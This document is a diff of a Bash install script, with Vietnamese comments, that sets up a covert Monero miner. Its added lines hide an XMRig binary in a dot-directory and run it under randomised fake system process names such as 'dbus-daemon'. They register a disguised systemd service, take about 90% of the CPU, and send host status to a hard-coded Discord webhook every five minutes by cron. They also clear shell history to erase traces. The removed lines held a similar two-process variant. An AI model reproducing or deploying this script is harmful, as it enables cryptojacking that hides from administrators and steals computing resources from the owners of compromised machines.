@@ -3,142 +3,106 @@
 
 # bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)
 
-
 # ========== CONFIG ==========
-WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # ⚠️ Thay ví của bạn vào đây
+WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"
 POOL="pool.hashvault.pro:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
-# ========== END CONFIG ==========
+WORKER="stealth_$(hostname)"
 
-WORKER1="core_$(hostname)_$(shuf -i 1000-9999 -n1)"
-WORKER2="silent_$(hostname)_$(shuf -i 1000-9999 -n1)"
+TOTAL_CORES=$(nproc)
+CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.9)}")
+PRIORITY=5
 
-TOTALCORE=$(nproc)
-TOTAL_MINING_THREADS=$TOTALCORE
-THREADS1=$(awk "BEGIN {print int($TOTAL_CORES * 0.40)}")
-THREADS2=$(awk "BEGIN {print int($TOTAL_CORES * 0.60)}")
+FAKE_NAME=$(shuf -n1 -e "dbus-daemon" "systemd-journald" "udevd" "sys-cleaner" "cronlog")
+INSTALL_DIR="$HOME/.local/share/.system"
+SERVICE_NAME=$(shuf -n1 -e "sysdaemon" "core-logger" "netwatchd" "usb-handler")
+LOG_FILE="/tmp/.core-log.txt"
+# ============================
 
-PRIORITY=3
-NAME1=$(shuf -n1 -e "dbusd" "syscore" "udevd")
-NAME2=$(shuf -n1 -e "corelogd" "netlog" "sysnet")
-DIR1="$HOME/.local/share/.cache/.dbus1"
-DIR2="$HOME/.local/share/.cache/.dbus2"
-SERVICE1=$(shuf -n1 -e "systemd-resolver" "kernel-log" "net-fix")
-SERVICE2=$(shuf -n1 -e "auditd" "modprobe-sync" "xinetd")
-LOG1="/tmp/xmrig-log1.log"
-LOG2="/tmp/xmrig-log2.log"
-KEY="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
+echo "🛠️ Đang cài đặt XMRig stealth (không dùng processhider)..."
 
-
-
-echo "🚀 Đang cài đặt XMRig"
+# Cài gói cần thiết
 sudo apt update
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl
-# Clone và build XMRig
+
+# Bật HugePages để tăng tốc
+sudo sysctl -w vm.nr_hugepages=128
+sudo bash -c 'echo "vm.nr_hugepages=128" >> /etc/sysctl.conf'
+
+# Clone & build XMRig
 cd ~
 rm -rf xmrig
 git clone https://github.com/xmrig/xmrig.git
 cd xmrig
 mkdir build && cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
-make -j$TOTAL_CORE
+make -j$TOTAL_CORES
 
-# Copy file binary
-mkdir -p "$DIR1" "$DIR2"
-cp ./xmrig "$DIR1/$NAME1"
-cp ./xmrig "$DIR2/$NAME2"
-chmod +x "$DIR1/$NAME1" "$DIR2/$NAME2"
+# Tạo thư mục ẩn & copy file
+mkdir -p "$INSTALL_DIR"
+cp ~/xmrig/build/xmrig "$INSTALL_DIR/xmrig"
+chmod +x "$INSTALL_DIR/xmrig"
 
-# Tạo systemd cho tiến trình
-sudo tee /etc/systemd/system/$SERVICE1.service > /dev/null << EOF
-[Unit]
-Description=Core Miner Fallback
-After=network.target
-
-[Service]
-ExecStart=$DIR1/$NAME1 -o $POOL -u $KEY.$WORKER1 -k --coin monero --tls \\
-  --cpu-priority=$PRIORITY --threads=$THREADS1 --donate-level=0 \\
-  --max-cpu-usage=65 --log-file=$LOG1
-Restart=always
-Nice=10
-
-[Install]
-WantedBy=multi-user.target
-EOF
-sudo tee /etc/systemd/system/$SERVICE2.service > /dev/null << EOF
-[Unit]
-Description=Core Miner
-After=network.target
-
-[Service]
-ExecStart=$DIR2/$NAME2 -o $POOL -u $WALLET.$WORKER2 -k --coin monero --tls \\
-  --cpu-priority=$PRIORITY --threads=$THREADS2 --donate-level=0 \\
-  --max-cpu-usage=65 --log-file=$LOG2
-Restart=always
-Nice=10
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# Kích hoạt cả service
-sudo systemctl daemon-reload
-sudo systemctl enable $SERVICE1
-sudo systemctl enable $SERVICE2
-sudo systemctl start $SERVICE1
-sudo systemctl start $SERVICE2
-
-# Tạo script gửi log cả 2 tiến trình về Discord
-tee "$DIR1/logminer.sh" > /dev/null << 'EOF'
+# Tạo script runner dùng exec -a để ngụy trang tiến trình
+tee "$INSTALL_DIR/$FAKE_NAME" > /dev/null << EOF
 #!/bin/bash
-WEBHOOK="$WEBHOOK"
-HOST="$(hostname)"
+exec -a $FAKE_NAME "$INSTALL_DIR/xmrig" -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
+  --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \\
+  --max-cpu-usage=85 --log-file=$LOG_FILE
+EOF
 
-PROCESS1="$NAME1"
-THREADS1='$THREADS1'
-LOG1="/tmp/xmrig-log1.log"
+chmod +x "$INSTALL_DIR/$FAKE_NAME"
 
-PROCESS2="$NAME2"
-THREADS2='$THREADS2'
-LOG2="/tmp/xmrig-log2.log"
+# Tạo systemd service
+sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null << EOF
+[Unit]
+Description=System Monitor Daemon
+After=network.target
 
-CPU_USAGE=$(top -bn1 | grep "Cpu(s)" | awk '{print $2 + $4}')
-UPTIME=$(uptime -p)
-TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+[Service]
+ExecStart=$INSTALL_DIR/$FAKE_NAME
+Restart=always
+Nice=0
 
-if [ -z "$WEBHOOK" ]; then
-  echo "❌ Chưa có webhook"
-  exit 1
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Kích hoạt & chạy service
+sudo systemctl daemon-reload
+sudo systemctl enable $SERVICE_NAME
+sudo systemctl start $SERVICE_NAME
+
+# Tạo script gửi log Discord
+tee "$INSTALL_DIR/logger.sh" > /dev/null << EOF
+#!/bin/bash
+WEBHOOK="$DISCORD_WEBHOOK"
+PROCESS_NAME="$FAKE_NAME"
+HOST="\$(hostname)"
+HASHRATE="Unknown"
+LOG_FILE="$LOG_FILE"
+
+if [ -f "\$LOG_FILE" ]; then
+  HASHRATE=\$(grep -i "speed" "\$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
 fi
 
+CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
+UPTIME=\$(uptime -p)
+THREADS=\$(nproc)
+
 curl -s -H "Content-Type: application/json" -X POST -d "{
-  \"username\": \"XMRig - $HOST\",
-  \"embeds\": [{
-    \"title\": \"💻 Main Process\",
-    \"color\": 3066993,
-    \"fields\": [
-      { \"name\": \"⚙️ Process\",    \"value\": \"\`$PROCESS1\`\",  \"inline\": true },
-      { \"name\": \"🧠 Threads\",    \"value\": \"\`$THREADS1\`\",   \"inline\": true },
-      { \"name\": \"📈 CPU Usage\",  \"value\": \"\`${CPU_USAGE}%\`\", \"inline\": true },
-      { \"name\": \"⏱️ Uptime\",     \"value\": \"\`$UPTIME\`\",     \"inline\": false }
-    ],
-    \"timestamp\": \"$TIME\"
-  },
-  {
-    \"title\": \"🎯 Silent Process\",
-    \"color\": 15105570,
-    \"fields\": [
-      { \"name\": \"⚙️ Process\",    \"value\": \"\`$PROCESS2\`\",  \"inline\": true },
-      { \"name\": \"🧠 Threads\",    \"value\": \"\`$THREADS2\`\",   \"inline\": true },
-      { \"name\": \"📁 Log File\",   \"value\": \"\`$LOG2\`\",       \"inline\": false }
-    ],
-    \"timestamp\": \"$TIME\"
-  }]
-}" "$WEBHOOK" > /dev/null 2>&1
+  \\"username\\": \\"XMRig Stealth\\",
+  \\"content\\": \\"🖥️ \\\`\$HOST\\\` đang đào XMR\\n🔧 Process: \\\`$FAKE_NAME\\\`\\n🧵 Threads: \\\`\$THREADS\\\`\\n⚡ Hashrate: \\\`\$HASHRATE\\\`\\n💻 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n🕒 Uptime: \\\`\$UPTIME\\\`\\"
+}" "\$WEBHOOK" > /dev/null 2>&1
 EOF
 
-chmod +x "$DIR1/logminer.sh"
-WEBHOOK="$DISCORD_WEBHOOK" "$DIR1/logminer.sh"
+chmod +x "$INSTALL_DIR/logger.sh"
+
+# Cron gửi log mỗi 5 phút
+(crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logger.sh") | crontab -
+
+# Gửi log lần đầu
+"$INSTALL_DIR/logger.sh"
 
 # Xoá dấu vết
 cd ~
@@ -146,11 +110,4 @@ rm -rf xmrig
 history -c
 
 echo ""
-echo "✅ Đang đào  🚀"
-
-# Cài htop nếu chưa có
-if ! command -v htop >/dev/null 2>&1; then
-    echo "📦 Đang cài đặt htop"
-    sudo apt install -y htop
-fi
-exec htop
+echo "✅ Đã cài đặt XMRig stealth không cần processhider! Log gửi về Discord mỗi 5 phút 🚀"
